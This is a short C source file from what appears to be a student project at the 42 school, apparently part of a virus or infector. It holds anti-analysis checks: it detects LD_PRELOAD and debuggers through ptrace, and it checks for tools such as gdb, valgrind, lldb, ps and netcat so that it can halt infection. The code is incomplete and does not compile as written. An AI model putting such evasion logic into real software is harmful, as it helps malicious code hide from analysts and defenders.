/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   stop_exectution.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 18:21:26 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 18:21:26 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */


/*
** check ptrace
** check getenv
** check allowed process
*/

#define FORBIDEN_PROCESS { "cat", "top", "htop", "gdb", "netcat", "ps", "valgrind", "lldb", NULL}

char            stop_exection("encryptation shit")
{
    const char *forbidens[] = FORBIDEN_PROCESS;

    if (getenv("LD_PRELOAD"))
        return (SUCCESS);
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == FAILURE)
        return (SUCCESS);
    if (check_tracers("encryptation shit"))
        return (SUCCESS);
    if (check_process((char **)&forbidens[0]))
        return (SUCCESS);
    /* more shit to see later */
    return (FAILURE);
}

/* REMNEBER THAT RET SUCCES IF HAVE TO STOP */
/* if this return false i have to just not infect or kill ??? */